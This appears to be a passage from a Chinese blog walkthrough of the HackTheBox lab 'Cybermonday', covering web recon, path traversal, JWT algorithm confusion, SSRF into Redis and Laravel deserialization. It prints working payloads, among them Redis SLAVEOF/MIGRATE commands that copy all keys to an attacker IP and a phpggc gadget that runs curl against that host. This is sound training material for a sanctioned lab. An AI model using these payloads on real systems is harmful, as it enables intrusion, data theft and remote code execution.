---
title: Cybermonday - HackTheBox
url: https://darkwing.moe/2023/08/23/Cybermonday-HackTheBox/
source: 喵喵喵喵
date: 2023-08-24
fetch_date: 2025-10-04T11:58:40.187539
---

# Cybermonday - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Cybermonday - HackTheBox

# Cybermonday - HackTheBox

##### 2023-08-23

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. cybermonda](#cybermonda)
   1. [3.1. debug mode](#debug-mode)
   2. [3.2. isAdmin](#isAdmin)
   3. [3.3. Dashboard](#Dashboard)
   4. [3.4. LFI](#LFI)
   5. [3.5. .git](#git)
4. [4. webhook](#webhook)
   1. [4.1. x-access-token](#x-access-token)
   2. [4.2. Webhooks](#Webhooks)
5. [5. JWT](#JWT)
   1. [5.1. Algorithm confusion](#Algorithm-confusion)
6. [6. sendRequest](#sendRequest)
   1. [6.1. redis slaveof](#redis-slaveof)
7. [7. Laravel](#Laravel)
   1. [7.1. cookie decrypt](#cookie-decrypt)
   2. [7.2. shell](#shell)
8. [8. Docker](#Docker)
   1. [8.1. docker Registry](#docker-Registry)
   2. [8.2. LogsController](#LogsController)
   3. [8.3. Logs LFI](#Logs-LFI)
9. [9. user flag](#user-flag)
10. [10. 提权信息](#提权信息)
    1. [10.1. secure\_compose.py](#secure-compose-py)
11. [11. 提权 & root flag](#提权-amp-root-flag)
    1. [11.1. miao.yml](#miao-yml)
    2. [11.2. shadow](#shadow)
12. [12. 参考资料](#参考资料)

# Cybermonday - HackTheBox

2023-08-23

# 基本信息

* <https://app.hackthebox.com/machines/Cybermonday>
* 10.10.11.228

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082101.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.228 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 14:00 CST Nmap scan report for 10.10.11.228 Host is up (0.12s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA) |   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA) |_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519) 80/tcp open  http    nginx 1.25.1 |_http-title: Did not follow redirect to http://cybermonday.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 52.47 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.228 cybermonday.htb ``` |

一个在线商城：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082102.jpg)

# cybermonda

随意注册登录，cookie是base64编码json:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082103.jpg)

## debug mode

注册时尝试sql注入，例如使用`miao'`作为用户名，报错发现开了debug mode：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082104.jpg)

其中可以看到有一个isAdmin属性：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082105.jpg)

## isAdmin

回到正常用户，有一个更新Profile的功能，更新的时候尝试添加isAdmin参数，成功成为管理员,多了一个Dashboard：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082106.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082107.jpg)

## Dashboard

changelog中发现webhook子域名，同样添加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.228 cybermonday.htb webhooks-api-beta.cybermonday.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082108.jpg)

## LFI

这里测试还可以发现一个路径穿越导致LFI,nginx配置的问题，配置文件中使用alias，上下不一致：

* 三个案例看Nginx配置安全 | 离别歌
  <https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082115.jpg)

## .git

同样存在git泄漏，结合上面的路径穿越：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` http://cybermonday.htb/assets../.git/config  git-dumper "http://cybermonday.htb/assets../.git" git_dump ``` |

# webhook

访问给出的webhook是404，直接访问根路径给出api信息：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082109.jpg)

## x-access-token

根据API注册登录，得到x-access-token是JWT,其中role是user：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082110.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082111.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082112.jpg)

## Webhooks

使用得到的token查看webhooks,uuid就是dashboard里显示的那个：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082113.jpg)

现有的action是createLogFile，根据API调用，响应成功，但不知道写入位置：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082114.jpg)

当前token因为是user，创建webhook无权限

# JWT

基础的探测可以发现jwks.json:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` http://webhooks-api-beta.cybermonday.htb/jwks.json ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082116.jpg)

## Algorithm confusion

现有信息，有jwks，有user的jwt，需要admin的jwt，这种场景：

* Algorithm confusion attacks | Web Security Academy
  <https://portswigger.net/web-security/jwt/algorithm-confusion>
* JWT Vulnerabilities (Json Web Tokens) - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555>

根据参考资料内容，首先提取出公钥，然后倒入到Burp扩展中测试利用：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` python3 ~/Tools/jwt_tool/jwt_tool.py -t http://webhooks-api-beta.cybermonday.htb/webhooks -rh "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJtaWFvIiwicm9sZSI6InVzZXIifQ.cIue1XS4uxo6dUVE8XLsMlFHrXghXju0mTtKvr9mzAUezYku6z8JAQuWHWsvnNesdqZCbHgKIsegWFe4H-k-PgxewNHWpdB8gy90r0k2J4oS7Ddo0_79SApjKgKOuXF1gYDmpKYu1IK2wmeVF7v6tkhPDsJmEgXWEBnHvmAWCP70PIBtgGUXqI25L7BxLmkPnnItX4lvvRrr7Vcm7x7XFfzvAI_ZdfsBYZaDRC6wqGnFsQtt7zIEXriUgPrQZpIe_nHXWOAqfifSDDyOCWOorxu8WKIJ2pSb0wi9ujMSxmzqMKPccZuGZlasGMneoYSCbEedJZPvOMJHFGfBYwAq_g" -V -jw jwks.json  Found RSA key factors, generating a public key [+] kid_0_1692601371.pem ``` |

导入Burp扩展后，修改jwt内容，使用Attack->HMAC key Confusion方式，选择我们导入的pem，签名后发送，现在我们是admin，可以创建新的webhook使用sendRequest action：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082117.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082118.jpg)

# sendRequest

现在可以调用我们创建的webhook使用sendRequest方法，根据api是url和method两个参数，url必须http协议，method可以任意：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082119.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082120.jpg)

## redis slaveof

已有条件只能SSRF，根据前面LFI中得到的一些信息，尝试使用redis的slaveof：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` {"url":"http://redis:6379","method":"slaveof 10.10.16.2 6379\r\n\r\n"} ``` |

可以接收到来自redis的ping请求：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082121.jpg)

修改请求通过主从获取redis中数据(主站那里正常登录触发)：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` {"url":"http://redis:6379","method":"EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.16.2\",\"6379\",v,0,200) end' 0\r\n*1\r\n$20\r\n"} ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082122.jpg)

# Laravel

现在已有条件，可以控制Laravel用到的redis，那就可以尝试修改redis中的数据来打反序列化：

注意修改payload中对应的长度，以及引号和斜杠的转义:

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ~/Tools/phpggc/phpggc Laravel/RCE10 system 'curl 10.10.16.2:7777'  {"url": "http://redis:6379","method": "*3\r\n$3\r\nset\r\n$56\r\nlaravel_session:57VLa9wNMwVgQp0NGnBckednmh0LCTS0OFnYlVGT\r\n$238\r\nO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:20:\"curl 10.10.16.2:7777\";}i:1;s:4:\"user\";}}\r\n*1\r\n$4\r\nquit\r\n"} ``` |

![](https://raw.githubuserco...